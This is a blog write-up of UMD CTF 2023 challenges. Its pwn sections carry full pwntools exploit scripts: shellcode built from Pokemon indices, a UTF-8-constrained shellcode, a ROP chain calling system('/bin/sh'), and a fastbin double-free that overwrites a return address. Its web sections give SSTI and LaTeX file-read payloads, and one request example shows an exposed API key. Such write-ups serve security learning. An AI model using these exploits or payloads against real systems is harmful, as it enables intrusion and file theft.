@@ -1,0 +1,575 @@
+---
+title: "UMD CTF 2023 Writeup"
+date: "2023-05-03"
+tags: ['Writeup']
+draft: false
+summary: "This is the writeup for the umd ctf 2023 which was held by the University of Maryland. They provided a lot of interesting challenges in the Pokemon theme which I really enjoy :>."
+---
+
+This is the writeup for the umd ctf 2023 which was held by the University of Maryland. They provided a lot of interesting challenges in the Pokemon theme which I really enjoy :>. 
+
+
+
+| Category | Challenge                 | Description                            |
+| -------- | ------------------------- | -------------------------------------- |
+| Pwn      | Splash                    | integer overflow                       |
+|          | Pokemon games             | shellcode, reverse engineering         |
+|          | You Want Me To Run What?? | golang, shellcode, reverse engineering |
+|          | belt (Other)              | stack overflow                         |
+|          | Secure Banking (Other)    | double free, off-by-one, logic flaw    |
+| Web      | Terps Ticketing System    | logic flaw                             |
+|          | Pop calc                  | template injection                     |
+|          | Notsogeo                  | API inspection                         |
+|          | Homework Render           | latex injection                        |
+|          | i heart wasm              | wasm, reverse engineering              |
+|          | POKéPTCHA                 | js obfuscation, anti-debugging         |
+
+## Pwn
+
+### splash
+
+>I bet you can't beat my totally legitimate Magikarp! I'll even let you use your Arceus.
+
+This challenge is about integer overflow vulnerability.
+
+It's evident that the adversary's health is a massive integer, `0x7ffffffe`. However, the variable is stored as an int (signed int) data type, which utilizes the largest bit as a sign and has a range of -2,147,483,648 to 2,147,483,647. Consequently, when it's incremented by 0x2, the integer value becomes `0x80000000`, the smallest possible negative number.
+
+![splash-2](/static/images/UMD-CTF-2023-Writeup/splash-2.png)
+
+A simple payload would lead us to get the flag.
+
+![splash-1](/static/images/UMD-CTF-2023-Writeup/splash-1.png)
+
+### Pokemon games
+
+>gotta catch them all... *right*?
+
+It is another interesting game about Pokemon and shellcode.
+
+The game includes a dictionary containing Pokemons, with their indices serving as opcodes. Ultimately, the captured Pokemons' indices are combined and executed. Additionally, there is an attacker-controlled variable, 'ability', which can manipulate the probability of the catching process and the entry of the shellcode execution function.
+
+Firstly, we could reverse-engineer the binary and extract the dictionary for opcodes and pokemon.
+
+![catch-all-3](/static/images/UMD-CTF-2023-Writeup/catch-all-3.png)
+
+Here is the exploit script:
+
+```
+"""
+Solution:
+    1/ set ability field (0x10) to 0x7 so that we have 100% to catch the pokemon
+    1/ This chall give us the ability to use the index of pokemon to constructe an shellcode and execute it.
+"""
+
+def get_shellcode_pokemon_encode():
+    ## read opcode dictionary from creatures.json
+    with open("creatures.json", "r") as f:
+        opcodes = json.load(f)
+
+    shellcode = asm(shellcraft.i386.linux.sh())
+    opcodes_rev  = {int(v, 16): k for k, v in opcodes.items()}
+
+    ## get creatures catching index
+    catching_list = []
+    for i in shellcode:
+        catching_list.append(opcodes_rev[i])
+    
+    return catching_list
+
+def found_pokemon():
+    while True:
+        text = sh.recvline().decode('utf-8').strip()
+        if "searching for pokemon... found" in text:
+            break
+    pattern = r'found (\w+)!'
+    match = re.search(pattern, text)
+    if match:
+        creature_name = match.group(1)
+        return creature_name
+    else:
+        return None
+
+def catch_pokemon(choice):
+    sh.recvuntil("would you like to catch? y/n:")
+    sh.sendline(choice)
+
+def init():
+    payload = b'A'*0x10 + p32(0x7)
+    sh.sendline(payload)
+    inital_data = sh.recvuntil(b'}')
+    log.info(inital_data)
+
+def use_up_left():
+    for i in range(56):
+        found_pokemon()
+        catch_pokemon(b'y')
+
+
+def exploit():
+    init()
+    for i in range(len(catching_list)):
+        while True:
+            found_creature = found_pokemon()
+            if found_creature == catching_list[i]:
+                log.info(f"Catched {found_creature}! Current index: {i}.")
+                catch_pokemon(b'y')
+                break
+            else:
+                catch_pokemon(b'n')
+
+if __name__ == "__main__":
+    catching_list = get_shellcode_pokemon_encode()
+    log.info(f"Our catching list: {catching_list}")
+
+    sh = start()
+    exploit()
+    use_up_left()
+    sh.sendline(b'ls')
+    sh.sendline(b'cat flag.txt')
+    log.info(sh.recv())
+    log.info(sh.recv())
+    sh.interactive()
+```
+
+![catch-all-2](/static/images/UMD-CTF-2023-Writeup/catch-all-2.png)
+
+![catch-all-1](/static/images/UMD-CTF-2023-Writeup/catch-all-1.png)
+
+### You Want Me To Run What??
+
+>You Want Me To Run ***What***??
+
+This challenge provided a binary, which is written in go, that accepts 16 bytes from the user and returns something as follows.
+
+```
+MMMM you want me to run WHAT?
+AAAAAAAAAAAAAAA
+Time to show your message to the CPU and see what it thinks!
+Your message made the CPU sad :(
+```
+
+However, it is really a taxing process to reverse engineer a binary written in go, as the symbol table is stripped and there are so many unrelated library functions that will also be compiled in the binary. 
+
+Try not to be lost in the functions, I first search for the `flag` string in the strings and found a function, `sub_4cdcc0`, that could probably read the flag for us. Starting from the main function would not be a good idea as the binary serves as a server and it would be hard to locate the function that processes our input.
+
+Following the `xrefs`, I found that `sub_4CD140` should be the function that processes our input since there are several printable strings that we can identify although ida pro didn't rewrite them for us.
+
+![youwantmerunwhat-1](/static/images/UMD-CTF-2023-Writeup/youwantmerunwhat-1.png)
+
+Then, we can put our eyes on the main logic and there are two functions, `sub_4CD080` and `sub_4CDB60` that we need to bypass.
+
+![youwantmerunwhat-2](/static/images/UMD-CTF-2023-Writeup/youwantmerunwhat-2.png)
+
+For the first check, it looks like the function would run our input bytes, however, we can run it dynamically and see what is going on inside. Stepping into the function, I found our bytes will be executed.
+
+![youwantmerunwhat-3](/static/images/UMD-CTF-2023-Writeup/youwantmerunwhat-3.png)
+
+Therefore, we could inject our shellcode that jumps to the place where all the checking has been done and try to read the flag since they didn't compile the program in the PIE. However, when send my first version of the payload, it said that `That is not a family-friendly thing to run!` which seems there is another check at the beginning.
+
+```
+payload = shellcraft.amd64.mov('rax', 0x4CD6D9)
+payload += "jmp rax"
+shellcode = asm(payload)
+```
+
+There is another check function, `sub_46F340`, before our check functions 1 and 2. The function `sub_46F340()` checks the input string to ensure that it is a valid UTF-8 encoded sequence. It iterates over the input string and checks each byte to make sure it follows the UTF-8 encoding rules.
+
+![youwantmerunwhat-4](/static/images/UMD-CTF-2023-Writeup/youwantmerunwhat-4.png)
+
+So, it requires our input to be compatible with UTF-8 encoding and also has a length shorten than 16 bytes. Here is the way to construct the satisfied shellcode. 
+
+```
+"""
+allow byte: 0x1 - 0x80, 0xc3 - 0xf5
+
+http://ref.x86asm.net/coder64.html
+cannot use jmp or call instruction: 0xff
+cannot use mov from immediate to register: 0xB8-0xBF
+cannot use add/sub from immediate to register: 0x81, 0x83
+...
+
+we use an trick here to avoid \x00
+push 0x4040012f
+pop bx 
+=> only mov 0x12f to bx
+
+current ret addr: 0x4ce26a
+next ret addr: 0x04cd5aa
+our target addr: 0x4CD6D9
+"""
+payload = """
+push rbp
+pop rax
+add al, 0x30
+push 0x4040012f
+pop bx
+add [rax], bx
+"""
+
+shellcode = asm(payload)
+log.info(f"shellcode length: {len(shellcode)}; content: {shellcode}")
+sh = start()
+sh.recvuntil(b'MMMM you want me to run WHAT?')
+sh.sendline(shellcode)
+sh.interactive()
+```
+
+Finally, we could get the flag by sending the payload.
+
+![youwantmerunwhat-5](/static/images/UMD-CTF-2023-Writeup/youwantmerunwhat-5.png)
+
+## Web
+
+### Terps Ticketing System
+
+>Welcome to the Terps Ticketing System! We're currently giving out tickets for the UMDCTF going on right now. Just enter some information and grab your ticket!
+
+set num=0
+
+![ticket-1](/static/images/UMD-CTF-2023-Writeup/ticket-1.png)
+
+### Pop calc
+
+>We have created a new calculator application to fit all your mathematical needs. Give it a try!
+
+SSTI
+
+However, since the application is a calculator, the response is only a value or ERROR sign but not a template-generated html. So, I didn't think of template injection at the beginning but for code injection in an eval-like function. However, after trying different payloads, I found that it seems using `[\d.]+[+-*/]?[\d.]+` regex for sanitization.
+
+Finally, when I tried `{{7*7}}`, I found it returned `ERROR 49`,  meaning our code has been evaluated. Then, it comes to a simple template injection for the ninja template. However, I don't why it returns `ERROR` and the payload has also been evaluated. 
+
+![pop-clac](/static/images/UMD-CTF-2023-Writeup/pop-clac.png)
+
+![pop-calc-2](/static/images/UMD-CTF-2023-Writeup/pop-calc-2.png)
+
+### Notsogeo
+
+>Here is an early iteration of Geosint that is more similar to how GeoGuessr loads its Street View panorama. I wonder how we can find the location?
+>
+>Note: https://github.com/JustHackingCo/geosint this is not the source for this challenge but it is what the site is based off of :)
+
+Two important API requests for loading the street view:
+
+```
+GET /maps/api/js/AuthenticationService.Authenticate?1shttps%3A%2F%2Fnotsogeo.chall.lol%2Fchall&4sAIzaSyBCDNiWcrx9rLjH11gyhIaXCZQl18WTiPY&8b0&callback=_xdc_._q1aios&key=AIzaSyBCDNiWcrx9rLjH11gyhIaXCZQl18WTiPY&token=60775
+
+GET /v1/tile?cb_client=maps_sv.tactile&panoid=E79vkEu2pHDfiUkvUWHciA&output=tile&x=0&y=0&zoom=0&nbt=1&fover=2 HTTP/1.1
+```
+
+Get the `panoid`, short for "panorama ID," is a unique identifier assigned to each panorama image in Google Street View and the key. Let's request the metadata.
+
+```
+https://maps.googleapis.com/maps/api/streetview/metadata?pano=E79vkEu2pHDfiUkvUWHciA&key=AIzaSyBCDNiWcrx9rLjH11gyhIaXCZQl18WTiPY
+```
+
+![notsogeo-3](/static/images/UMD-CTF-2023-Writeup/notsogeo-3.png)
+
+Send the request with the location will give us the flag:
+
+![notsogeo-5](/static/images/UMD-CTF-2023-Writeup/notsogeo-5.png)
+
+### Homework Render
+
+>https://hw-render.chall.lol/
+>
+>Isn't writing math homework hard? We have created an easy-to-use homework submission portal that allows you to type up your homework. We don't think anyone can get into this server for free answers!
+
+Latex injection
+
+Some exploits:
+
+```
+\RequirePackage{import}
+\begin{document}
+  \import{}{/proc/self/cwd/flag}
+\end{document}
+```
+
+```
+\begin{document}
+\^^69nput{/app/flag}
+\end{document}
+```
+
+### i-hate-wasm
+
+>https://i-heart-wasm.chall.lol/
+>
+>I've been messing around with WASM lately. Turns out, there's a ton of cool things you can do with it! Time to rewrite everything in Rust.
+
+
+
+### POKéPTCHA
+
+>pokeptcha.chall.lol
+>
+>Team Rocket keeps taking down my website! I'm testing out this new type of captcha, but it doesn't seem to be working as expected. None of the choices are valid! Can you solve it for me?
+
+
+
+## Others
+
+This weekend, I also played two pwn challenges with my friend.  
+
+### Belt
+
+The belt challenge is a typical stack overflow challenge.
+
+In the reg function, there is a stack overflow where using the gets function to read from the stdin. Although the function checks the length of input afterward, we already overflow the current stack. This is a typical vulnerable programming pattern that causes a stack overflow.
+
+![belt-1](/static/images/UMD-CTF-2023-Writeup/belt-1.png)
+
+However, since the binary has all the mitigation set, we also need to leak the elf loading address so that we could construct a rop chain to leak the glibc loading address and call system('/bin/sh'). Luckily, each belt function tries to print the function's address. And to get the function called, we just need to enter the `dojo` function and correctly answer the question.
+
+![belt-2](/static/images/UMD-CTF-2023-Writeup/belt-2.png)
+
+The complete exploit is as follows.
+
+```
+sh = start()
+
+def menu(choice):
+    sh.recvuntil(b"Enter your choice:")
+    sh.sendline(choice)
+
+def reg(name, age, payload, skip=False):
+    if skip == False:
+        menu(b'1')
+        sh.recvuntil(b"Enter your username:")
+    sh.sendline(name)
+    sh.recvuntil(b"Enter your age:")
+    sh.sendline(age)
+    sh.recvuntil(b"Enter your address:")
+    sh.sendline(payload)
+
+def edit(name, payload):
+    menu(b'4')
+    sh.recvuntil(b"Enter new Name:")
+    sh.sendline(name)
+    sh.recvuntil(b"Enter the new address:")
+    sh.sendline(payload)
+
+def get_belt():
+    menu(b'2')
+    sh.recvline()
+    leaked_info = sh.recvuntil('1.) Register your info\n')
+    start_pos = len("Congrats on solving 1/3 challenges, we have sent the belt to your address: ")+0x2C
+    leaked_addr = get_leaked_addr_raw(leaked_info,start_pos,start_pos+6)
+    return leaked_addr
+
+def get_elf_loading():
+    menu(b'3')
+    sh.recvuntil(b"Can you execute shellcode in this binary on the stack?[y/n] ")
+    sh.sendline(b"n")
+    sh.recvuntil(b"You have been awarded the white belt!Do you want to continue?[y/n] ")
+    sh.sendline(b"n")
+    elf_loadding_addr = get_belt() - binary.symbols['white']
+    return elf_loadding_addr
+
+## warmup the chunk
+edit(b'A'*14, b'B'*0x2B)
+
+## leak the elf loading address
+elf_loadding_addr = get_elf_loading()
+log.info(f"elf_loadding_addr: {hex(elf_loadding_addr)}")
+
+## leak the libc address
+puts_plt = elf_loadding_addr + binary.plt['puts']
+puts_got = elf_loadding_addr + binary.got['puts']
+pop_rdi = elf_loadding_addr + binary.search(asm("pop rdi; ret;")).__next__()
+ret = elf_loadding_addr + binary.search(asm("ret;")).__next__()
+reg_addr = elf_loadding_addr + binary.symbols['reg']
+
+payload = b'A'*0x38 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(reg_addr)
+reg(b'A'*14, b'99', payload)
+
+leaked_puts_got_addr = get_leaked_addr_raw(sh.recvline(), 1, -1)
+log.info(f"leaked_puts_got_addr: {hex(leaked_puts_got_addr)}")
+
+leaked_libc_addr, system_addr, binsh_addr = get_libcbase(leaked_puts_got_addr, 'puts')
+log.info(f"leaked_libc_addr: {hex(leaked_libc_addr)}")
+log.info(f"system_addr: {hex(system_addr)}")
+log.info(f"binsh_addr: {hex(binsh_addr)}")
+
+payload2 = b'A'*0x38 + p64(pop_rdi) + p64(binsh_addr) + p64(ret) + p64(system_addr)
+reg(b'A'*14, b'99', payload2, True)
+
+sh.interactive()
+```
+
+### Secure Banking
+
+This challenge gives us the ability to malloc and free chunks in arbitrary sizes with initialized content. However, then, we cannot either read or write the content of the chunks.
+
+**double free**
+
+![belt-1](/static/images/UMD-CTF-2023-Writeup/secure-banking-1.png)
+
+It has simple mitigation for double-free, that it saves the last freed chunk ptr to a global variable and tries to compare it with the current freeing chunk ptr. It can be bypassed by inserting another freed chunk between the victim chunks. Therefore, we could leverage the double-free in fastbin to get an arbitrary address write. We cannot use the double-free in tcache since there is an additional check in the key field and we cannot modify the chunk(no uaf).
+
+**leak the stack addr**
+
+Since the challenge has `Full Relro` mitigation set, we cannot overwrite the got table anymore. Then, we need to overwrite the ret address in the stack. To leak the stack address, usually, we need to find a chunk or place that has an existing stack ptr and we can somehow find a way to print that out.
+
+In this challenge, there is a bug that we can leverage but is very likely to be overlooked. To update a field in the account registration chunk, it first allocates an area on the stack and then tries to read data from stdin to that stack area, and then assigns it to the place in the chunk.
+
+![belt-2](/static/images/UMD-CTF-2023-Writeup/secure-banking-2.png)
+
+However, it uses a quite weird way to get the memory on the stack. Expecting to read 6 items and each of the items contains 8 bytes, it only allocates 8 bytes on the stack serving as an offset array, and each time left shift 3 bits to get the start address.
+
+![belt-3](/static/images/UMD-CTF-2023-Writeup/secure-banking-3.png)
+
+In this case, if we input nothing, the original content on the stack will be passed to the field in the account registration chunk. Therefore, if we could find a way to print that field out, we could get a stack address.
+
+**bypass the key check by off-by-one**
+
+However, when initializing the account registration chunk, it will generate an 0x28 bytes security key as a field on the chunk. To print the other fields of the account registration chunk, we need to enter that key. 
+
+![belt-4](/static/images/UMD-CTF-2023-Writeup/secure-banking-4.png)
+
+However, since there is no other way to print out the content of the chunk in this binary except we pass the key check in the open function. We need to either leverage the flaw in the key generation process or modify the key field.
+
+In this challenge, the key generation process is quite secure and I cannot find a way to guess the key. Then, we need to choose the latter solution.
+
+The layout of the account registration chunk looks like the following:
+
+```
+tatal malloc size: 0xd8
+name: 0x8
+key: 0x28(0x20+\x00*8)
+AC holders: 0x28(0x8*5)
+money chunk ptrs: 0x80 (up to 16 chunks ptr for money) 
+```
+
+When we edit the name field in the edit function, there is a typical vulnerable programming pattern for off-by-one. The `scanf` function would append `0x00` after the reading of strings, and strcpy would keep the `0x00` and pass it to the destination memory. In this case, our key field can be append null at the beginning, so that we could pass the key check.
+
+![belt-5](/static/images/UMD-CTF-2023-Writeup/secure-banking-5.png)
+
+Here is a [summary](https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/16/input/) of the features of these functions related to strings.
+
+![belt-6](/static/images/UMD-CTF-2023-Writeup/secure-banking-6.png)
+
+Putting the above things together, we could get our final exploit.
+
+```
+sh = start()
+
+"""
+=======================Exploit Script Starts==========================
+Solution
+1. double free to give us the arbitrary address write but due to full relro, we can't overwrite the got table
+2. write the stack address to the account chunk through edit function
+3. overwrite the first bytes of key filed to 0x00 throuhg off-by-one in edit function
+4. open the vault to leak the stack address
+5. overwrite the ret addr on the stack to the win addr through double free
+"""
+
+def menu(choice):
+    sh.recvuntil(b"Enter the menu choice: ")
+    sh.sendline(choice)
+
+def register(name=b'jack', ac=b'11111'):
+    sh.recvuntil(b"Enter the vault name: ")
+    sh.sendline(name)
+    sh.sendline()
+    for i in range(5):
+        sh.recvuntil(b"Ac")
+        sh.sendline(ac)
+    
+def deposit(size, val, index):
+    menu(b'1')
+    sh.recvuntil(b'Enter the size of $$$ stacks(<0x120):')
+    sh.sendline(size)
+    sh.recvuntil(b'Stack the Vault: ')
+    sh.sendline(val)
+    sh.recvline()
+
+    return index
+
+def withdraw(index):
+    menu(b'2')
+    sh.recvuntil(b'Enter index: ')
+    sh.sendline(index)
+
+def edit(name, ac):
+    menu(b'4')
+    sh.recvuntil(b"Do you wish to change your vault's name?[y/n]: ")
+    sh.sendline(b'y')
+    sh.recvuntil(b'Enter new vault name: ')
+    sh.sendline(name)
+    sh.recvuntil(b"Do you wish to change your vault's ac holders?[y/n]: ")
+    sh.sendline(b'y')
+    for i in range(5):
+        sh.recvuntil(b"AC")
+        sh.sendline(ac)
+    sh.recvuntil(b"Do you want to renew the key to your vault?")
+    sh.sendline(b'n')
+
+
+def open_vault(key):
+    menu(b'3')
+    sh.recvuntil(b"Enter the vault passkey...")
+    sh.sendline(key)
+    sh.recvuntil(b"Accounts:\n")
+    for i in range(5):
+        addr = int(sh.recvline()[len("   Account #0: "):-1])
+        log.info(hex(addr))
+        if i == 4:
+            return addr
+    
+    return addr # the last addr 0x7ffd867417a0
+
+
+def arbitrary_address_write(addr, val):
+     # fill the tchche
+    for i in range(7):
+        deposit(b'16', b'A'*0x10, 0)
+
+    # chunks for double free 
+    deposit(b'16', b'A'*0x10, 7)
+    deposit(b'16', b'B'*0x10, 8)
+    deposit(b'16', b'B'*0x10, 9)
+    
+    # # placed in tcache
+    for i in range(7):
+        withdraw(str(i).encode('utf-8'))
+
+    # placed in fastbin
+    withdraw(b'7')
+    withdraw(b'8')
+    withdraw(b'7')
+
+    # exhaust the tchche
+    for i in range(7):
+        deposit(b'16', b'A'*0x10, 0)
+
+    deposit(b'16', addr, 7)
+    deposit(b'16', b'C'*0x10, 8)
+    deposit(b'16', b'D'*0x10, 9)
+    deposit(b'16', val, 10)
+
+def exploit():
+    register()
+
+    # leak the stack addr
+    edit(b'A'*8, b'\x00')
+    stack_addr = open_vault(b'-') # 0x7ffd04d834c0
+    ret_main_addr = stack_addr + 0x28 # 0x7ffd04d834e8
+
+    log.info(f"get an stack addr {hex(stack_addr)}")
+    log.info(f"get an ret_main addr {hex(ret_main_addr)}")
+
+    win_addr = binary.symbols['win']
+    log.info(f"Overwite the ret addr to win function: {hex(win_addr)}")
+
+    arbitrary_address_write(p64(ret_main_addr-8), b'A'*8+p64(win_addr+1)) ## movaps issue so +1
+    
+    menu(b'5')
+    sh.interactive()
+
+if __name__ == "__main__":
+    exploit()
+```
+
+![belt-7](/static/images/UMD-CTF-2023-Writeup/secure-banking-7.png)
+
